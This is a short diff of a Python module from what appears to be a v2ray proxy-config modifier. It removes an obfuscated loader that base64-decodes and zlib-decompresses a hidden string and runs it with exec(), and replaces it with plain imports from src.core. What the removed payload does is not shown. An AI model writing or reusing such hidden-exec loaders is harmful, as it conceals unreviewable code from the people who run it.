@@ -1,9 +1,8 @@
-# OBFUSCATED_V3 - BPB Easy Active Config MAIN v9.0.0
-# This file is protected. Unauthorized modification is prohibited.
-# Copyright (c) 2026 mcoders
-import base64 as _b;import zlib as _z
-_d=_b.b64decode(
-    'eNp1zUEKAjEMheF9TxHqTmZci+BJRELtpEOgTUpaN57e6UpUZvvzHt8B5uMMUReW9QLPnubzKC6ZFmgWT1GNgEtV67CSkIVOWLZ9YlowqiRe2wSiVkLmFyFX'
-    'zNz6BDVYo8/CqOYQCUmWqizboNXMHdvz0aJx7ayyPYWac4ghZ0S4ws3von4C/8eO+AWP8EuPtof7u3sDocNkog=='
-)
-exec(_z.decompress(_d).decode('utf-8'))
+# -*- coding: utf-8 -*-
+"""Integrated Rasoul/v2ray-config-modifier-style core.
+Endpoint replacement and bulk generation live in src.core; this module exposes them as
+standalone source next to the project.
+"""
+from src.core import generate_modified_configs, normalize_ip_list, parse_configs, replace_endpoint, split_subscription_lines
+
+__all__ = ["generate_modified_configs", "normalize_ip_list", "parse_configs", "replace_endpoint", "split_subscription_lines"]
